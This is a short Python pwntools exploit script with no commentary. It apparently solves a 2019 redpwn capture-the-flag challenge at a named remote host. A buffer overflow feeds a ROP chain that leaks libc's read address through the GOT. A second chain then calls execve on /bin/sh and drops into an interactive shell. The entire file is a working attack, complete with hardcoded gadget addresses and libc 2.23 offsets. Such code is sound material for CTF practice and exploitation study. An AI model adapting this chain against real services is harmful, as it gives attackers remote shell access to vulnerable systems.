from pwn import *

###Addr
#  libc2.23
printf_got = 0x601fd0
read_got = 0x601fd8
bss = 0x602f00
read_offset = 0xf7250
system_offset = 0x45390

###ROPgadget
set_param = 0x40081a
call_func = 0x400800
leave = 0x400739
L_pop_rdi = 0x21102
L_pop_rsi = 0x202e8
L_pop_rdx = 0x1b92
L_pop_rax = 0x33544
L_syscall = 0xbc375

###Exploit
r = remote('chall.2019.redpwn.net',4008)

r.sendlineafter('bytes: ','0')
padding = b'a'*0x11
ROPchain  = p64(set_param)+p64(0)+p64(1)+p64(printf_got)+p64(read_got)+p64(0)+p64(0)
ROPchain += p64(call_func)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(bss)+p64(0x100)
ROPchain += p64(call_func)+p64(0)+p64(0)+p64(bss)+p64(0)+p64(0)+p64(0)+p64(0)
ROPchain += p64(leave)
payload= padding+ROPchain
r.sendline(payload)
read_addr = u64(r.recv()+b'\x00\x00')
libc_base = read_addr-read_offset
print(hex(libc_base))

argument = b'/bin/sh\x00'
ROPchain  = p64(libc_base+L_pop_rdi)+p64(bss)
ROPchain += p64(libc_base+L_pop_rsi)+p64(0)
ROPchain += p64(libc_base+L_pop_rdx)+p64(0)
ROPchain += p64(libc_base+L_pop_rax)+p64(59)
ROPchain += p64(libc_base+L_syscall)
payload = argument+ROPchain
r.send(payload)

r.interactive()
